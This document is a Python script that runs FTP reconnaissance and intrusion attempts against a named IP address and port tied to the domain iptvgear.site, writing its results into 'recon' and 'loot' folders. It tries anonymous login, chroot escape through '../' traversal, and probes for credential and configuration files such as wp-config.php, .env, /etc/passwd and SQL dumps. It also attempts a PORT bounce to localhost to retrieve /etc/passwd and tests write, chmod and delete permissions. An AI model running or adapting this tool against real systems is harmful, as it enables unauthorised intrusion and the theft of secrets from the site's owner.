#!/usr/bin/env python3
"""FTP enumeration script using ftplib."""
import ftplib
import sys
import os
from datetime import datetime

HOST = "103.160.107.175"
PORT = 6969
OUTDIR = "/home/ubuntu/iptvgear.site"
MAP = f"{OUTDIR}/recon/active/ftp_filesystem.txt"
CREDS = f"{OUTDIR}/loot/ftp_creds.txt"
FILES_MD = f"{OUTDIR}/loot/ftp_files.md"

os.makedirs(f"{OUTDIR}/recon/active", exist_ok=True)
os.makedirs(f"{OUTDIR}/loot", exist_ok=True)

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

def try_ftp_cmds(initial_cwd=None, cmds=None, label=""):
    """Connect to FTP, optionally CWD first, then send raw commands via FTP.retr."""
    log(f"\n{'='*60}")
    log(f"--- {label} ---")
    log(f"{'='*60}")

    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=15)
        # Suppress default behavior
        log(f"Banner: {ftp.getwelcome()}")
        
        # Login anonymous
        resp = ftp.login("anonymous", "anonymous@test.com")
        log(f"LOGIN: {resp}")
        
        # Try to get system type
        try:
            sys_resp = ftp.sendcmd("SYST")
            log(f"SYST: {sys_resp}")
        except Exception as e:
            log(f"SYST error: {e}")

        # Try FEAT
        try:
            feat_resp = ftp.sendcmd("FEAT")
            log(f"FEAT:\n{feat_resp}")
        except Exception as e:
            log(f"FEAT error: {e}")
        
        # Try PWD
        try:
            pwd_resp = ftp.pwd()
            log(f"PWD: {pwd_resp}")
        except Exception as e:
            log(f"PWD error: {e}")

        # Try STAT with no args
        try:
            stat_resp = ftp.sendcmd("STAT")
            log(f"STAT (root):\n{stat_resp}")
        except Exception as e:
            log(f"STAT error: {e}")
        
        if initial_cwd:
            try:
                cwd_resp = ftp.sendcmd(f"CWD {initial_cwd}")
                log(f"CWD {initial_cwd}: {cwd_resp}")
                try:
                    pwd_resp = ftp.pwd()
                    log(f"PWD: {pwd_resp}")
                except:
                    pass
                try:
                    stat_resp = ftp.sendcmd("STAT")
                    log(f"STAT after CWD:\n{stat_resp}")
                except Exception as e:
                    log(f"STAT error: {e}")
            except Exception as e:
                log(f"CWD {initial_cwd} error: {e}")
        
        if cmds:
            for cmd in cmds:
                try:
                    resp = ftp.sendcmd(cmd)
                    log(f"> {cmd}\n{resp}")
                except Exception as e:
                    log(f"> {cmd}\n  ERROR: {e}")
        
        ftp.quit()
    except Exception as e:
        log(f"Connection error: {e}")

log(f"{'='*70}")
log(f"FTP ENUMERATION - {HOST}:{PORT}")
log(f"Date: {datetime.utcnow().isoformat()}")
log(f"{'='*70}")

# Phase 1: Basic info + root STAT
try_ftp_cmds(label="1. BASIC INFO & ROOT STAT")

# Phase 2: Directory mapping via CWD + STAT
paths = [
    "/", "/www", "/www/html", "/www/iptvgear.site",
    "/public_html", "/home", "/home/iptvgear", "/home/iptvgear/public_html",
    "/home/iptvgear.site", "/var", "/var/www", "/var/www/html",
    "/var/www/vhosts", "/var/www/vhosts/iptvgear.site",
    "/var/www/vhosts/iptvgear.site/httpdocs",
    "/usr", "/usr/local", "/usr/local/www", "/usr/local/apache",
    "/etc", "/etc/httpd", "/etc/apache2",
]

log(f"\n{'='*70}")
log("2. DIRECTORY MAPPING VIA CWD + STAT")
log(f"{'='*70}")

for p in paths:
    try_ftp_cmds(initial_cwd=p, label=f"CWD + STAT: {p}")

# Phase 3: Chroot escape
log(f"\n{'='*70}")
log("3. CHROOT ESCAPE ATTEMPTS")
log(f"{'='*70}")

escape_paths = ["..", "../..", "../../../", "../../../..", 
                "../../../../..", "../../../../../..",
                "/etc", "/var/www", "/"]

for p in escape_paths:
    try_ftp_cmds(initial_cwd=p, label=f"ESCAPE CWD: {p}")

# Phase 4: MDTM + SIZE checks
log(f"\n{'='*70}")
log("4. MDTM + SIZE CHECKS")
log(f"{'='*70}")

check_files = [
    "wp-config.php", "/wp-config.php",
    "/etc/passwd",
    "/home/iptvgear/public_html/wp-config.php",
    "/var/www/html/wp-config.php",
    "/var/www/vhosts/iptvgear.site/httpdocs/wp-config.php",
    "/www/iptvgear.site/wp-config.php",
    ".env", "/.env",
    "config.php", "/config.php",
    "configuration.php",
    "db.php", "database.php",
    "backup.sql", "dump.sql",
    ".htaccess", "/.htaccess",
    ".gitignore",
    "composer.json",
    "index.htm", "index.html", "index.php",
]

for f in check_files:
    try:
        ftp = ftplib.FTP()
        ftp.connect(HOST, PORT, timeout=15)
        ftp.login("anonymous", "anonymous@test.com")
        
        # MDTM
        try:
            resp = ftp.sendcmd(f"MDTM {f}")
            log(f"MDTM {f}: {resp}")
        except Exception as e:
            pass  # silent, many will fail
        
        # SIZE
        try:
            resp = ftp.sendcmd(f"SIZE {f}")
            log(f"SIZE {f}: {resp}")
        except Exception as e:
            pass
        
        ftp.quit()
    except:
        pass

# Phase 5: PORT mode test
log(f"\n{'='*70}")
log("5. PORT MODE TEST")
log(f"{'='*70}")

try:
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=15)
    ftp.login("anonymous", "anonymous@test.com")
    
    # Try PORT with localhost
    try:
        # PORT h1,h2,h3,h4,p1,p2 where port = p1*256+p2
        # 127.0.0.1 port 21 = 0,21
        resp = ftp.sendcmd("PORT 127,0,0,1,0,21")
        log(f"PORT 127,0,0,1,0,21: {resp}")
    except Exception as e:
        log(f"PORT error: {e}")
    
    try:
        resp = ftp.sendcmd("RETR /etc/passwd")
        log(f"RETR /etc/passwd: {resp}")
    except Exception as e:
        log(f"RETR error: {e}")
    
    ftp.quit()
except Exception as e:
    log(f"PORT mode connection error: {e}")

# Phase 6: Write permission test
log(f"\n{'='*70}")
log("6. WRITE PERMISSION TESTS")
log(f"{'='*70}")

try:
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=15)
    ftp.login("anonymous", "anonymous@test.com")
    
    for cmd in ["SITE MKDIR test123", "SITE CHMOD 777 test", "DELE test123", "RMD test123"]:
        try:
            resp = ftp.sendcmd(cmd)
            log(f"> {cmd}\n  {resp}")
        except Exception as e:
            log(f"> {cmd}\n  ERROR: {str(e)[:200]}")
    
    ftp.quit()
except Exception as e:
    log(f"Write test connection error: {e}")

log(f"\n{'='*70}")
log("ENUMERATION COMPLETE")
log(f"{'='*70}")